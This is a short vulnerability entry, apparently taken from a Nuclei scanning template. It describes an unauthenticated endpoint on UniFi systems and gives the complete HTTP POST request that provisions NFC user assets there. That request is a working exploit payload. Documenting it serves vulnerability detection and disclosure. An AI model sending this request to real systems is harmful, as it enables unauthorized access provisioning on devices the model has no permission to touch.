# Vulnerability: UniFi - Unauthenticated Creation Access For Users
**Classification:** UNIFI
**Source:** Nuclei Template (`unifi-create-user.yaml`)

## Description
The /api/v1/user_assets/nfc endpoint accepts unauthenticated POST requests with NFC provisioning data (e.g., alias, asset_id, nfc_id, tokens) and returns {"code":"CODE_SUCCESS"} over HTTP, confirming backend processing without any authentication or session validation.

## Vulnerable Code Pattern / Exploit Payload
```http
@Host: {{Host}}:9780
POST /api/v1/user_assets/nfc HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "alias": "{{rand_string}}",
  "asset_id": "1",
  "need_provision": true,
  "nfc_id": "1",
  "plain_token": "1",
  "sys_id": "1",
  "token": "1",
  "ua_card_id": "1",
  "ua_card_pub_key": "1"
}
```

